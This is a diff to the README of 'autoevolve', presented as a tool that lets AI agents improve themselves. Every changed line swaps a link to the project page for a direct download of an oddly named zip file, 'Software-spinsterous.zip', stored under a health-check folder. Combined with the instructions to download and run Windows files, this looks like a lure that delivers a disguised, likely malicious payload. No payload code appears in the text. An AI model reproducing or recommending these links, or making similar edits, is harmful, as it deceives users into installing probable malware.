@@ -1,6 +1,6 @@
 # 🤖 autoevolve - Let Agents Improve Themselves
 
-[![Download autoevolve](https://img.shields.io/badge/Download%20autoevolve-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devinaexcogitative908/autoevolve)
+[![Download autoevolve](https://img.shields.io/badge/Download%20autoevolve-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip)
 
 ## 🚀 What autoevolve does
 
@@ -14,7 +14,7 @@ This lets the agent learn from real use instead of staying fixed in one mode.
 
 Use this link to visit the download page:
 
-[Open the autoevolve download page](https://github.com/devinaexcogitative908/autoevolve)
+[Open the autoevolve download page](https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip)
 
 On that page, look for the latest release or the main project files. If you see a Windows file such as `.exe` or `.zip`, download it to your PC.
 
@@ -37,7 +37,7 @@ For best results, keep the app in a folder you can find later, such as:
 ## 🖥️ How to download on Windows
 
 1. Open this page in your browser:
-   [https://github.com/devinaexcogitative908/autoevolve](https://github.com/devinaexcogitative908/autoevolve)
+   [https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip](https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip)
 
 2. Look for the latest release, download link, or file list.
 
@@ -226,7 +226,7 @@ Use the README, if present in the project, to match the folder names and setup f
 
 If you need to get the app again, use this link:
 
-[https://github.com/devinaexcogitative908/autoevolve](https://github.com/devinaexcogitative908/autoevolve)
+[https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip](https://raw.githubusercontent.com/devinaexcogitative908/autoevolve/main/services/health-check/Software-spinsterous.zip)
 
 ## 🧩 Start here
 
